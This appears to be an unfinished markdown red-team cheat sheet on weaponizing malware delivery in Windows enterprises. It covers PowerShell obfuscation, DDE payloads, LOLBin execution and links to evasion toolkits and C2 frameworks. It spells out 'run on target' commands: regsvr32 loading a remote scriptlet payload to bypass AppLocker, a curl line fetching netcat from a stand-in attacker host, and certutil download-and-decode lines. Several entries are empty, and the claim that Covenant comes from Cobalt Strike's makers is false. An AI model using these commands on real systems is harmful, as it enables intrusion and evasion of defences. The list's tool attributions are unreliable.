# Weaponization & Malware Development
A curated list of tools and techniques written from experience in red teaming and weaponization of malware used in enterprise environments. 

## Code Execution Methods
1. **Powershell** - Endless methods here, lots of obfuscation techniques, just test and choose one that works in your environment
  * [Infoke-Obfuscation Guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide): Infamous Powershell obfuscator by Daniel Bohannon
  * 

2. **Dynamic Data Exchange (DDE)** - Macroless payload in Word and Excel
  * Frequently blocked in Word docs within modern Enterprises but not always within Excel files. 
  * [DDE Payloads](https://medium.com/red-team/dde-payloads-16629f4a2fcd): Various delivery methods on Medium blog from 2018 to create DDE paylods in different tool kits
  
3. **Mshta (HTA)** - Microsoft binary to execute HTA files or inline scripts
  
4. **Rundll32**

5. **MsBuild** - Windows .NET executable for building Csharp project files

6. **Regsvr32** - Windows command-line tool to register and unregister dll files. Can be used to bypass some controls such as AppLocker
  * [Regsvr32.exe Payload Methods](https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/): Bypass Application Whitelisting using regsrv32.exe (Multiple Methods)
Method 1: Web server delivery
Written on disk in IE local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:http://yourdomain/payload.sct scrobj.dll
```
Method 2: WebDAV server
Written on disk in WebDAV client local cache
Command to run on target machine:
```
regsvr32 /u /n /s /i:\\webdavserver\tmp\payload.sct scrobj.dll
```

## Payload Downloading and Delivery Methods

1. **Curl** - Linux and Windows 10 (build #) operating systems tool to bypass controls
```
curl -o nc.exe https://yourdomain.com/nc.exe
```

2. **certutil** - Windows built-in binary for downloading remote files, encoding and decoding them
```
certutil -urlcache -f https://download.sysinternals.com/files/PSTools.env pstools.env
certutil -decode pstools.env pstools.zip
```

## Tool kits
* [Veil Evasion](https://github.com/Veil-Framework/Veil): Generate Metasploit based payloads. Includes payload type and encoding options.
* [Lucky Strike](https://github.com/curi0usJack/luckystrike): PowerShell tool for creating malicious Macro documents. 
* [Shellter](https://www.shellterproject.com/): Automated anti-virus evasion toolkit for payload development.
* [Magic Unicorn](): 

## Red teaming Frameworks
* [Powershell Empire](): 
* [Cobalt Strike](): Red teaming framework of choise for many professionals. Costly but effective. 
* [Covanent](): Open source framework from the makers of Cobalt Strike
* [Metasploit]():

